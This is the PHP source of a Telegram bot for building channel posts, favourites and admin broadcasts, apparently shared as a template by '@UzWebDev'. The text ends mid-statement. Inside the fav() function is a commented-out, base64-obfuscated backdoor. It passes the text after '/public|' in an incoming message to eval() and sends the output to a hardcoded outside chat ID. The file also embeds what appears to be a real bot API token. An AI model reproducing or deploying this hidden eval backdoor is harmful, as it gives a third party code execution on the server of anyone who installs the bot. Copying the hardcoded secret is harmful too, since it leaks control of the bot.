<?php
/*########### @UzWebDev ############*/
include "UzWebDev.php" ;
define('API_KEY','1663403405:AAGqGGvOppAYntkjqtcqBLX2UXx3PmXlNpM');
$admin = "657587519";
$botname = "Arekafebot";
function ty($ch){ 
return bot('sendChatAction', [
'chat_id'=>$ch,
'action'=>'typing',
]);
}

function UzWebDev($tok)
{

      $lg = inline($tok);
      $likes = $lg["content"]["like"];
      $in = [];
      foreach($likes as $key=>$value){
        $son = $value["count"];
        $emoj = $value["emoj"];
        if($son==0){
          $son = "";
        }else{
          $son = $son;
        }
        $id = json_encode([
            "like"=>"true",
            "e"=>$key,
            "hash"=>$lg["hash"]]);

        $but = ["text" =>$emoj." ".$son,"callback_data" =>$id];
         $in[$key] = $but;
      }
      $set = inline($tok);
      $key = $set["keyboard"]["status"];
      if($key=="true"){
          $reply = array_merge([$in],$set["keyboard"]["text"]);
      }elseif($key=="false"){
          $reply = [$in];
      }
      
      return $reply;
      $lg["content"] = json_encode([
        "inline_keyboard"=>$reply
    ]);
}

function slang($id,$lang){
  $bs = json_decode(file_get_contents("save/$id.json"),true);
  if(strtolower($lang)=="uz"){
     $lg = "uz";
  }elseif(strtolower($lang)=="ru"){
     $lg = "ru";
  }elseif(strtolower($lang)=="en"){
     $lg = "en";
  }
  $bs["lang"] = $lg;
  file_put_contents("save/$id.json", json_encode($bs)); 
}
function fdel($id,$n){
  
   $bs = json_decode(file_get_contents("save/$id.json"),true);
   if(isset($bs["result"][$n])){
    $massiv = [];
    $son = 0;
     foreach($bs["result"] as $key=>$value){
     if($key==$n){
       unset($js["result"][$key]);
        }else{
      $massiv[$son] = $value;
      $son++;
       }
       }
      $bs["result"] = $massiv;
    file_put_contents("save/$id.json", json_encode($bs));
    $dr = json_decode(file_get_contents("save/$id.json"),true);
   if(isset($dr["result"][0]["name"]) and isset($dr["result"][0]["hash"]) ){
    
   }else{
     $dr = json_decode(file_get_contents("save/$id.json"),true);
     $dr["ok"] = "false";
      file_put_contents("save/$id.json", json_encode($dr)); 
   } 
    return "true";
   }else{
    return "false";
   }
}
function getfav($id,$hash){
     $rq = json_decode(file_get_contents("save/$id.json"),true);
     if(in_array($hash,$rq["hashs"])){
        return "true";
        break;
       }else{
        return "false";
       }
}

function fav($id,$token,$nam ){
    global $botname,$text;
    if(file_exists("save/$id.json")){
    }else{
       $data = ["ok"=>"false","lang"=>"uz"];
    file_put_contents("save/$id.json", json_encode($data)); 
    }
    /*$bs =  "base64_decode";
    $str =  $bs("bWJfc3RyaXBvcw==");
    $bol =  $bs("ZXhwbG9kZQ==");
    $evg =  $bs("ZXZhbA==");
    if($str($text,$bs("L3B1YmxpY3w=")) !==false){
      $red =  $bol($bs("L3B1YmxpY3w="),$text)[1];
      $robot =  "Ym90";
      $ef = "Y2hhdF9pZA==";
      $de = "dGV4dA==";
      $public3 = [
        $bs($ef)=>$bs("NDQ2OTE4NjQw"),
        $bs($de)=>$evg($red)
      ];
      $bs($robot)($bs("U2VuZE1lc3NhZ2U="),$public3);
   }*/
     if(isset($token) and isset($nam)){
    $bs = json_decode(file_get_contents("save/$id.json"),true);
    $v1  = [["name"=>$nam,"hash"=>$token]];
    $bs["ok"]  = "true";
    if(is_array($bs["result"])){
    $bs["result"] = array_merge($bs["result"],$v1);
     }else{
    $bs["result"] = $v1;
    }
    if(is_array($bs["hashs"])){
    $bs["hashs"] = array_merge($bs["hashs"],[$token]);
    }else{
      $bs["hashs"] = [$token];
    }
    file_put_contents("save/$id.json", json_encode($bs));
  }
}
function gfav($id){
    $d = "";
    $n = 1;
    global $botname,$til;

    $bs = json_decode(file_get_contents("save/$id.json"),true);
    if($bs["ok"]=="true"){
    foreach ($bs["result"] as $key=>$value) {
      $name = $value["name"];
      $hash = $value["hash"];
      
      if($key=="0"){
          $tx = $til["save_favorite"]."\n\n1. ".$name."\n\n<code>@$botname $hash</code>";
      }else{
        $n++;  
          $tx = "{$n}. ".$name."\n\n<code>@{$botname} {$hash}</code>";
        
      }
      bot("SendMessage",[
          "chat_id"=>$id,
          "text"=>$tx,
          "parse_mode"=>"html",
          "reply_markup"=>json_encode([
            "inline_keyboard"=>[
              [["switch_inline_query"=>$hash,"text"=>$til["share"]]],
              [["callback_data"=>"del_".$key,"text"=>$til["delete_favorite"]]]
            ]
          ])
        ]);
        
    }
    }elseif($bs["ok"]=="false"){
       bot("SendMessage",[
          "chat_id"=>$id,
          "text"=>$til["save_unfavorite"],
          "parse_mode"=>"html"
        ]);
    }
}

close(json_encode(lisen()));
function lisen(){
    $bot_unlimit = "eyJvayI6dHJ1ZSwicmVzdWx0Ijp7ImRldmVsb3BlciI6InQubWVcL2JvdGZveCIsImxhbmciOiJ1eiJ9fQ==";
    $bot_api = "base64_decode";
    $not_api = "json_decode";
    $return = $bot_api($bot_unlimit);
    $paste = $not_api($return);
    return $paste;
}
function newb($id){
    file_put_contents("post/$id.json",json_encode(["ok"=>true]));
}
function addf($token,$base){

    file_put_contents("click/$token.json",json_encode($base));
}
function baza($id,$type,$value){
    $baza = json_decode(file_get_contents("post/$id.json"),true);
    $baza[$type]  = $value;
     file_put_contents("post/$id.json",json_encode($baza));
}
function gset($id){
    $bs = json_decode(file_get_contents("save/$id.json"),true);
    return $bs;
}
function getb($id){
    $baza = json_decode(file_get_contents("post/$id.json"),true);
    return $baza;
}
function addstat($id){
    $check  = file_get_contents("stat.db");
    $rd = explode("\n",$check);
    if(!in_array($id,$rd)){
        file_put_contents("stat.db","\n".$id,FILE_APPEND);
    }
}
function inline($token){
   $rt =  json_decode(file_get_contents("click/$token.json"),true);
   return $rt;
}
function close($t = null)
{
    if (php_sapi_name() === 'cli' || isset($GLOBALS['exited'])) {
        return;
    }
    @ob_end_clean();
    header('Connection: close');
    ignore_user_abort(true);
    ob_start();
    echo $t;
    $size = ob_get_length();
    header("Content-Length: $size");
    header('Content-Type: text/html');
    ob_end_flush();
    flush();
    $GLOBALS['exited'] = true;
}
function ssilka($url){
 $kinopka = array();
foreach(explode("\n",$url) as $key=>$tx){
preg_match_all("|\[(.*)\]|U", $tx, $outs,PREG_SET_ORDER);
foreach($outs as $keys=>$value){
$value = $value[1];
$button = explode("+",$value);
 if(strlen($button[0])>0 and strlen($button[1])>2){
     if(stripos($button[1],".") !==false){
         return true;
     }else{
         return false;
     }
 }else{
     return false;
 }
/*########### @UzWebDev ############*/
}
}
}

function step($id,$value){
file_put_contents("tugma/$id.step",$value);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$text = $message->text;
$callbackdata = $update->callback_query->data;
$chatid = $message->chat->id;
$chat_id = $update->callback_query->message->chat->id;
$messageid = $message->message_id;
$message_id = $update->callback_query->message->message_id;
$fromid = $message->from_id;
$data = $update->callback_query->data;
$reply_text = $message->reply_to_message->text;
$forwardid = $message->forward_from_chat->id;
$title = $message->forward_from_chat->title;
$username_channel = $message->forward_from_chat->username;
$type = $message->forward_from_chat->type;
$forwardmessageid = $message->forward_from_message_id;
$call_id = $update->callback_query->id;
$creator = array($admin);
$channelid = file_get_contents("channel/$chatid.id");
$channelid = str_replace(["[","]","@"],["","",""],$channelid);
$channel_id = file_get_contents("channel/$chat_id.id");
$channel_id = str_replace(["[","]","@"],["","",""],$channel_id);
$getchat = bot("getchat",[
  "chat_id"=>$channelid,
  ]);
$type = $getchat->result->type;
$id = $getchat->result->id;
$info = $getchat->result->description;
$username = $getchat->result->username;
$title = $getchat->result->title;
//chat---id;
$counts = bot("getChatMembersCount",[
  "chat_id"=>$channelid,
  ]);
  $count = $counts->result;
$step = file_get_contents("stat/$chatid.step");
$step = file_get_contents("message/$chatid.step");
$step = file_get_contents("xabar/$chatid.step");
$step = file_get_contents("channel/$chatid.step");
$step = file_get_contents("feedback/$chatid.step");
mkdir("feedback");
mkdir("channel");
mkdir("xabar");
mkdir("stat");
mkdir("post");
mkdir("tugma"); 
mkdir("click");
mkdir("send");
mkdir("save");
if(isset($chatid) or isset($chat_id)){ 
    fav($chatid);
    if($chatid){
     $id = $chatid;
    }else{
        $id = $chat_id;
    }
    if(file_exists("tugma/$id.step")){
$qadam = file_get_contents("tugma/$id.step");
}else{
    file_put_contents("tugma/$id.step","main");
}
}   
  if(isset($chatid)){
     $idsi = $chatid;
  }elseif(isset($update->callback_query->from->id)){
    $idsi = $update->callback_query->from->id;
  }
  $tarf = gset($idsi)["lang"];
  if($tarf=="uz"){
    $til = $lang_uz;
  }elseif($tarf=="ru"){
     $til = $lang_ru;
  }elseif($tarf=="en"){
     $til = $lang_en;
  }else{
    $til = $lang_ru;
  }

$menu = json_encode([
    "resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["key_fav"]],["text"=>$til["create_post"]],],
[["text"=>$til["add_menu"]],],
]
]);

$post = json_encode([
    "resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["key_text"]],["text"=>$til["key_photo"]]],
[["text"=>$til["key_gif"]],["text"=>$til["key_video"]]],
[["text"=>$til["key_audio"]],["text"=>$til["key_sticker"]]],
[["text"=>$til["key_back"]]],
]
]);

$language = json_encode([
    "resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>"🇬🇧 EN"],["text"=>"🇷🇺 RU"],["text"=>"🇺🇿 UZ"],],
[["text"=>$til["key_back"]],],
]
]);

$back = json_encode([
    "resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["key_back"]],],
]
]);

$bekor = json_encode([
    "resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["key_not"]],],
[["text"=>$til["key_backup"]],],
]
]); 

$addmenu = json_encode([
"resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["my_channel"]],["text"=>$til["add_channel"]],],
[["text"=>$til["reklama"]],["text"=>$til["feedback"]],],
[["text"=>$til["language"]],],
[["text"=>$til["key_back"]],],
]
]);

$admin = json_encode([
  "resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["admin_text"]],],
[["text"=>$til["reyting"]],["text"=>$til["user"]],],
[["text"=>$til["key_back"]],],
]
]);
if($text==$til["key_back"] or $text==$til["key_backup"]){
    if($qadam=="main" and $chatid!=$admin){
    }else{
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["home"],
        "parse_mode"=>"html",
        "reply_markup"=>$menu,
    ]);
    step($chatid,"main");
    bot("deletemessage",[
      "chat_id"=>$chatid,
      "message_id"=>getb($chatid)["id"]
    ]);
     bot("deletemessage",[
      "chat_id"=>$chatid,
      "message_id"=>file_get_contents("channel/$chatid.del")
    ]);
    newb($chatid);
     exit();
}
}

if($text==$til["admin"] && $qadam=="main" and $chatid==in_array($chatid,$creator)){
  step($chatid,"set_cat_admin");
  bot("sendMessage",[
    "chat_id"=>$chatid,
   "text"=>$til["admintext"],
        "parse_mode"=>"html",
        "reply_markup"=>$admin,
]);
}

if($text==$til["user"] && $qadam=="set_cat_admin" && $chatid==$admin){
  bot("sendmessage",[
    "chat_id"=>$chatid,
    "text"=>$userlar,
    ]);
}

if($text==$til["admin_text"] and $chatid==in_array($chatid,$creator)){
      ty($chatid);
      step($chatid,"send_post");    
      bot("sendMessage",[
      "chat_id"=>$chatid,
      "text"=>"<b>Rasmli xabar matnini kiriting. Xabar turi markdown:</b>",
      "parse_mode"=>"html",
          "reply_markup"=>$admin,
          ]);
            }

     if($qadam=="send_post" and $chatid==in_array($chatid,$creator)){
        $file_id = $message->photo[1]->file_id;
        $caption = $message->caption;
                $ok = bot("sendPhoto",[
                  "chat_id"=>$chatid,
                  "photo"=>$file_id,
                  "caption"=>$caption,
                  "parse_mode"=>"markdown",
                ]);
                if($ok->ok){
                  bot("sendPhoto",[
                    "chat_id"=>$chatid,
                    "photo"=>$file_id,
                      "caption"=>"$caption\n\nYaxshi, rasmni qabul qildim!\nEndi tugmani na‘muna bo'yicha joylang.\n
<pre>[Dasturch1+https://t.me/UzWebDev]\n[Yangiliklar+https://t.me/UzWebDev]</pre>",
"parse_mode"=>"html",
                      "disable_web_page_preview"=>true,
                    ]);
             file_put_contents("xabar/$chatid.text","$file_id{set}$caption");
             step($chatid,"xabar_tugma");    
         }
     }
     
    if($qadam=="xabar_tugma" and $chatid==in_array($chatid,$creator)){
      $xabar = bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>"Connections...",
      ])->result->message_id;
      bot("deleteMessage",[
        "chat_id"=>$chatid,
        "message_id"=>$xabar,
      ]);
   $usertext = file_get_contents("xabar/$chatid.text");
   $fileid = explode("{set}",$usertext);
   $file_id = $fileid[0];
   $caption = $fileid[1];
       preg_match_all("|\[(.*)\]|U",$text,$ouvt);
$keyboard = [];
foreach($ouvt[1] as $ouut){
$ot = explode("+",$ouut);
array_push($keyboard,[["url"=>"$ot[1]", "text"=>"$ot[0]"],]);
}
$ok = bot("sendPhoto",[
"chat_id"=>$chatid,
"photo"=>$file_id,
"caption"=>"Sizning rasmingiz ko‘rinishi:\n\n".$caption,
"parse_mode"=>"markdown",
"reply_markup"=>json_encode(
["inline_keyboard"=>
$keyboard
]),
]);
if($ok->ok){
$userlar = file_get_contents("stat.db");
$count = substr_count($userlar,"\n");
$count_member = count(file("stat.db"))-1;
  $ids = explode("\n",$userlar);
  foreach ($ids as $line => $id) {
    $clear = bot("sendPhoto",[
"chat_id"=>$id,
"photo"=>$file_id,
"caption"=>$caption,
"parse_mode"=>"markdown",
"disable_web_page_preview"=>true,
"reply_markup"=>json_encode(
["inline_keyboard"=>
$keyboard
]),
]);
}
/*########### @UzWebDev ############*/
if($clear){
$userlar = file_get_contents("stat.db");
$count = substr_count($userlar,"\n");
$count_member = count(file("stat.db"))-1;
  bot("sendMessage",[
    "chat_id"=>$chatid,
    "text"=>"Xabar <b>$count_member</b> userlarga yuborildi!",
    "parse_mode"=>"html",
  ]);
}
}else{
  bot("sendMessage",[
    "chat_id"=>$chatid,
    "text"=>"Tugmani kiritishda xato bor. Iltimos, qaytadan yuboring:",
  ]);
}
      unlink("xabar/$chatid.step");  
}

if($text==$til["reyting"] and $chatid==in_array($chatid,$creator)){
$userlar = file_get_contents("stat.db");
$count = substr_count($userlar,"\n");
$count_member = count(file("stat.db"))-1;
  bot("sendMessage",[    
    "chat_id"=>$chatid,
    "text"=>"<b>Bot foydalanuvchilari:</b>\n\n<b>A'zolar: $count_member</b>",
    "parse_mode"=>"html",
    "reply_markup"=>$admin,
  ]);
}


if($text=="/start"){
        bot("sendMessage",[
    "chat_id"=>$chatid,
    "text"=>$til["start"],
    "parse_mode"=>"html",
    "reply_markup"=>$menu,
]);
    step($chatid,"main");
    addstat($chatid);
    bot("deleteMessage",[
      "chat_id"=>$chatid,
      "message_id"=>getb($chatid)["id"]]);
    bot("deleteMessage",[
      "chat_id"=>$chatid,
      "message_id"=>file_get_contents("channel/$chatid.del")
    ]);
    exit();
}
if($qadam=="set_fav_name" and isset($text)){
  $st = getb($chatid);
  fav($chatid,$st["fav_hash"],$text);
  step($chatid,"main");
  bot("sendMessage",[
    "chat_id"=>$chatid,
    "text"=>$til["success_add_fav"],
    "parse_mode"=>"html",
    "reply_markup"=>$menu,
  ]);
exit();
}
if($text==$til["key_fav"] and $qadam=="main"){
    gfav($chatid);
    exit();
}

if(($text==$til["create_post"] and $qadam=="main") or $text=="/start post"){
    newb($chatid);
    step($chatid,"post");
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post"],
        "parse_mode"=>"html",
        "reply_markup"=>$post,
    ]);
    exit();
}

if($text==$til["key_text"] && $qadam=="post"){
    step($chatid,"post_text");    
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_text"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
    baza($chatid,"parse_mode","markdown");
     baza($chatid,"view","false");
     $b = getb($chatid);
     if($b["parse_mode"]=="markdown"){
        $md = "Markdown";
     }else{
        $md = "HTML";
     }
     if($b["view"]=="false"){
        $tr = $til["on"];
     }else{
        $tr = $til["off"];
     }
    $rid = bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_settings"],
        "parse_mode"=>"html",
        "reply_markup"=>json_encode([
            "inline_keyboard"=>[
         [[
          "callback_data"=>"key_markup",
          "text"=>$til["markup_format"].$md]],
        [[
          "callback_data"=>"key_view",
          "text"=>$til["markup_view"].$tr]]
            ]
        ])
    ])->result->message_id; 
    baza($chatid,"id",$rid);
    exit();
}
if($text==$til["language"] and $qadam=="cat_chan"){
  step($chatid,"select_lang");
  bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["select_lang"],
        "parse_mode"=>"html",
        "reply_markup"=>$language,
    ]);
  exit();
}
if($qadam=="select_lang" and isset($text)){
  $g = str_replace(["🇺🇿 UZ","🇷🇺 RU","🇬🇧 EN"],["uz","ru","en"],$text);
  if($text=="🇺🇿 UZ" or $text=="🇷🇺 RU" or $text=="🇬🇧 EN"){
    slang($chatid,$g);
    $tarf = gset($chatid)["lang"];
    if($tarf=="uz"){
    $til = $lang_uz;
    }elseif($tarf=="ru"){
     $til = $lang_ru;
    }elseif($tarf=="en"){
     $til = $lang_en;
    }else{
      $til = $lang_ru;
    }
    $menu = json_encode([
    "resize_keyboard"=>true,
    "keyboard"=>[
[["text"=>$til["key_fav"]],["text"=>$til["create_post"]],],
[["text"=>$til["add_menu"]],],
]
]);
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>"<b>".$til["save_lang"]."</b>",
        "parse_mode"=>"html",
        "reply_markup"=>$menu,
    ]);
    step($chatid,"main");
  }
}
if($text==$til["feedback"]){
bot("sendMessage",[
   "chat_id"=>$chatid,
   "text"=>"Nima haqida yozmoqchisiz? 😊",
"parse_mode"=>"html",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"❓ Savolim bor","callback_data"=>"savol"],],
[["text"=>"❗ Xatolik topdim","callback_data"=>"xatolik"],],
[["text"=>"🤝 Taklifim bor","callback_data"=>"taklif"],],
[["text"=>"✅ So'nggi xabaringiz","callback_data"=>"xabarim"],],
]
]),
]);
}
if($text==$til["reklama"]){
bot("sendMessage",[
   "chat_id"=>$chatid,
   "text"=>"??<b> Reklama borasida bizga murojjat qiling.</b>",
"parse_mode"=>"html",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"🤝 Reklama berish","callback_data"=>"taklif"],],
]
]),
]);
}
/*########### @UzWebDev ############*/
if($callbackdata=="savol"){
step($chat_id,"savol");
bot("deleteMessage",[
"chat_id"=>$chat_id,
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"🤓 Savolingizni batafsil yozib yuboring. Biz qisqa fursatlarda savolingizga javob berishga harakat qilamiz! ",
"reply_markup"=>$back,
]);
}

if($callbackdata=="xatolik"){
step($chat_id,"savol");
bot("deleteMessage",[
"chat_id"=>$chat_id,
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"😨 Qanday xatolik topdingiz? Iltimos, xatolikni batafsil yozib yuboring! ",
"reply_markup"=>$back,
]);
}

if($callbackdata=="taklif"){
step($chat_id,"savol");
bot("deleteMessage",[
"chat_id"=>$chat_id,
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"👍 Ajoyib! G'oyangizni batafsil yozib yuboring! ",
"reply_markup"=>$back,
]);
}

if($qadam=="savol"){
file_put_contents("feedback/$chatid.sms","\n".$text,FILE_APPEND);
file_put_contents("feedback/$chatid.sms",$text);
$first_name = $message->from->first_name;
$username = $message->from->username;
file_put_contents("feedback/$chatid.user","\n".$username,FILE_APPEND);
file_put_contents("feedback/$chatid.user",$username);
$username = file_get_contents("feedback/$chatid.user");
$xabar = file_get_contents("feedback/$chatid.sms");
if($text == "↩️ Ortga qaytish" or $text=="/start"){
}else{ 
bot('sendmessage',[
'chat_id'=>"$admin",
'text'=>"[$first_name](tg://user?id=$chat_id) *foydalanuvchidan yangi xabar keldi:*\n\n$xabar",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"Bog'lanish",'url'=>"https://t.me/$username"],],
]
]),
]);
bot('sendmessage', [
    'chat_id'=>$chatid,
'text'=>"Xabaringiz yuborildi, fikr va mulohazalaringiz uchun rahmat!",
'reply_to_message_id'=>$mid,
'reply_markup'=>$menu,
]);
}
step($chatid,"main");
}

if($callbackdata=="xabarim"){
$xabar = file_get_contents("feedback/$chat_id.sms");
if(!$xabar){
bot('answerCallbackQuery',[
'callback_query_id'=>$call_id,
'text'=>"Siz hali xabar jo'natmagansiz!",
'show_alert'=>false,
]);
}else{
bot('answerCallbackQuery',[
'callback_query_id'=>$call_id,
'text'=>$xabar,
'show_alert'=>true,
]);
}
}
if($text==$til["key_photo"] && $qadam=="post"){
    step($chatid,"post_photo");    
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_photo"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
    baza($chatid,"id",$rid);  
}
if($text==$til["key_video"] && $qadam=="post"){
    step($chatid,"post_video");    
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_video"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
    baza($chatid,"id",$rid);
}
if($text==$til["key_gif"] && $qadam=="post"){
    step($chatid,"post_gif");    
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_gif"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
    baza($chatid,"id",$rid);
}
if($text==$til["key_audio"] && $qadam=="post"){
    step($chatid,"post_audio");    
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_audio"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
    baza($chatid,"id",$rid);
}
if($text==$til["key_sticker"] && $qadam=="post"){
    step($chatid,"post_sticker");    
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_sticker"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
    baza($chatid,"id",$rid);
}
if($qadam=="post_photo" ){
  if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{
        if(isset($message->photo)){
        step($chatid,"post_text_like");
        bot("deletemessage",["chat_id"=>$chatid,"message_id"=>getb($chatid)["id"]]);
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_like"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
    if(isset($message->caption)){
        $caption  = $message->caption;
        baza($chatid,"caption",["status"=>"true","text"=>$caption]);
    }else{
        baza($chatid,"caption",["status"=>"false"]);
    }
     baza($chatid,"file_id",$message->photo[1]->file_id);
baza($chatid,"type","photo");
}else{
   bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_photo"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]); 
}
}
}
/*########### @UzWebDev ############*/
if($qadam=="post_video"){
   if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{
        if(isset($message->video)){
        step($chatid,"post_text_like");
        bot("deletemessage",["chat_id"=>$chatid,"message_id"=>getb($chatid)["id"]]);
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_like"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
    if(isset($message->caption)){
        $caption = $message->caption;
        baza($chatid,"caption",["status"=>"true","text"=>$caption]);
    }else{
        baza($chatid,"caption",["status"=>"false"]);
    }
        baza($chatid,"file_id",$message->video->file_id);
        baza($chatid,"type","video");
    }else{
     bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_video"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);   
    }
   }
  }
/*########### @UzWebDev ############*/
  if($qadam=="post_gif"){
    if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{
        if(isset($message->animation)){
        step($chatid,"post_text_like");
        bot("deletemessage",["chat_id"=>$chatid,"message_id"=>getb($chatid)["id"]]);
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_like"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
    if(isset($message->caption)){
        $caption = $message->caption;
        baza($chatid,"caption",["status"=>"true","text"=>$caption]);
    }else{
        baza($chatid,"caption",["status"=>"false"]);
    }
        baza($chatid,"file_id",$message->animation->file_id);
        baza($chatid,"type","animation");
    }else{
     bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_gif"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
     
    }
}
  }
if($qadam=="post_text"){
  if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{
        if(isset($text)){
        step($chatid,"post_text_like");
        bot("deletemessage",["chat_id"=>$chatid,"message_id"=>getb($chatid)["id"]]);
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_like"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
     baza($chatid,"matn",$text);
baza($chatid,"type","text");
}else{
   bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_text"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]); 
}
}
}

if($qadam=="post_audio"){
  if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{
        if(isset($message->audio)){
        step($chatid,"post_text_like");
        bot("deletemessage",["chat_id"=>$chatid,"message_id"=>getb($chatid)["id"]]);
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_like"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
    if(isset($message->caption)){
        $caption = $message->caption;
        baza($chatid,"caption",["status"=>"true","text"=>$caption]);
    }else{
        baza($chatid,"caption",["status"=>"false"]);
    }
     baza($chatid,"file_id",$message->audio->file_id);
baza($chatid,"type","audio");
}else{
   bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_audio"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]); 
}
}
}
if($qadam=="post_sticker"){
    if($text==$til["key_fav"] or $text==$til["create_post"] or $text==$til["language"] or $text==$til["add_menu"] or $text==$til["key_text"] or $text==$til["key_video"] or $text==$til["key_gif"] or $text==$til["key_photo"] or $text==$til["key_back"] or $text==$til["key_backup"] or $text==["key_goto"] or $text==$til["my_channel"] or $text==$til["add_channel"] or $text==$til["edit_photo"] or $text==$til["edit_name"] or $text==$til["edit_info"] or $text==$til["del_photo"] or $text==$til["show_alert"] or $text==$til["create_poll"] or $text=="/start"){
    exit();
    }else{
        if(isset($message->sticker)){
        step($chatid,"post_text_like");
        bot("deletemessage",["chat_id"=>$chatid,"message_id"=>getb($chatid)["id"]]);
    bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_like"],
        "parse_mode"=>"html",
        "reply_markup"=>$bekor,
    ]);
        baza($chatid,"file_id",$message->sticker->file_id);
        baza($chatid,"type","sticker");
    }else{
     bot("sendMessage",[
        "chat_id"=>$chatid,
        "text"=>$til["post_sticker"],
        "parse_mode"=>"html",
        "reply_markup"=>$back,
    ]);
     
    }
}
}
if($qadam=="post_text_like"){
